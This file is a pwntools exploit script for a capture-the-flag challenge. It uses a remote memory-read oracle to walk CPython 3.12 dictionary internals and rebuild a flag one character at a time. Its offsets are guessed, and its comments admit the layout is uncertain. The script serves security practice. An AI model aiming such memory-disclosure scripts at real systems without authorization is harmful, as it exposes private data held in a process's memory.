from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Python 3.12 Dict Exploitation ===")

reads_used = 0
max_reads = 45

# Step 1: Get ma_keys pointer (should be at offset 0x20 based on previous analysis)
print("Reading ma_keys pointer...")
ma_keys_data = read_memory(dict_obj_addr + 0x20)
reads_used += 1

if not ma_keys_data:
    print("Failed to read ma_keys")
    io.close()
    exit(1)

ma_keys_ptr = u64(ma_keys_data)
print(f"ma_keys pointer: {ma_keys_ptr:#x}")

# Validate it's a reasonable pointer
if not (0x400000 < ma_keys_ptr < 0x800000000000):
    print("ma_keys doesn't look like a valid pointer")
    io.close()
    exit(1)

# Step 2: Get number of entries from PyDictKeysObject
# According to CPython 3.12, dk_nentries should be around offset 0x30-0x48 in keys object
print("Reading PyDictKeysObject metadata...")

# Try different offsets to find dk_nentries
nentries_candidates = []
for test_offset in [0x30, 0x38, 0x40, 0x48]:
    data = read_memory(ma_keys_ptr + test_offset)
    reads_used += 1
    
    if data:
        val = u64(data)
        print(f"  keys+{test_offset:#x}: {val}")
        
        # Reasonable dict size for a flag (5-50 entries)
        if 5 <= val <= 100:
            nentries_candidates.append((test_offset, val))

if not nentries_candidates:
    print("Could not find reasonable dk_nentries value")
    # Assume small dict size
    dk_nentries = 30  # Approximate flag length
    print(f"Assuming dk_nentries = {dk_nentries}")
else:
    _, dk_nentries = nentries_candidates[0]
    print(f"Using dk_nentries = {dk_nentries}")

# Step 3: Try to find dk_entries
# In Python 3.12, dk_entries typically starts after the keys object header + indices
# Let's try scanning from various offsets within the keys object

print(f"\nSearching for dict entries (expecting {dk_nentries} entries)...")
flag_data = {}

# Try different potential dk_entries starting points
for entries_offset in [0x50, 0x60, 0x70, 0x80, 0x90]:
    if reads_used >= max_reads - 10:
        break
        
    print(f"\nTrying entries at keys+{entries_offset:#x}")
    entries_addr = ma_keys_ptr + entries_offset
    
    # Read a few entries to see if they look valid
    entries_found = 0
    for i in range(min(5, dk_nentries)):  # Check first 5 entries
        if reads_used >= max_reads - 5:
            break
            
        # Each entry: hash(8) + key_ptr(8) + value_ptr(8) = 24 bytes
        entry_base = entries_addr + i * 24
        
        # Read key pointer (me_key)
        key_data = read_memory(entry_base + 8)  # Skip hash, read key ptr
        reads_used += 1
        
        # Read value pointer (me_value) 
        value_data = read_memory(entry_base + 16)  # Read value ptr
        reads_used += 1
        
        if key_data and value_data:
            key_ptr = u64(key_data)
            value_ptr = u64(value_data)
            
            print(f"  Entry {i}: key={key_ptr:#x}, value={value_ptr:#x}")
            
            # Try to read the actual key and value objects
            if 0x400000 < key_ptr < 0x800000000000 and reads_used < max_reads - 2:
                # Read key object (should be a small integer)
                key_obj = read_memory(key_ptr)
                reads_used += 1
                if key_obj:
                    # Extract integer value (this is tricky, depends on Python int representation)
                    # For small ints, the value might be directly readable
                    key_chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in key_obj)
                    print(f"    Key obj: {key_chars}")
            
            if 0x400000 < value_ptr < 0x800000000000 and reads_used < max_reads - 1:
                # Read value object (should be a single character string)
                value_obj = read_memory(value_ptr)
                reads_used += 1
                if value_obj:
                    # Look for the character data in the string object
                    value_chars = ''.join(chr(b) for b in value_obj if 32 <= b <= 126)
                    if len(value_chars) >= 1:
                        char = value_chars[0] if len(value_chars) == 1 else value_chars
                        print(f"    Value: '{char}' *** FLAG CHAR ***")
                        flag_data[i] = char
                        entries_found += 1

    if entries_found > 0:
        print(f"Found {entries_found} valid entries at this offset!")
        break

print(f"\n=== Results (used {reads_used}/{max_reads} reads) ===")
if flag_data:
    print("Flag characters extracted:")
    for idx, char in sorted(flag_data.items()):
        print(f"  Position {idx}: '{char}'")
    
    # Reconstruct flag attempt
    flag_chars = [flag_data.get(i, '?') for i in range(len(flag_data))]
    partial_flag = ''.join(flag_chars)
    print(f"\nPartial flag reconstruction: {partial_flag}")
else:
    print("No flag characters found. Dict structure might be different than expected.")

io.close()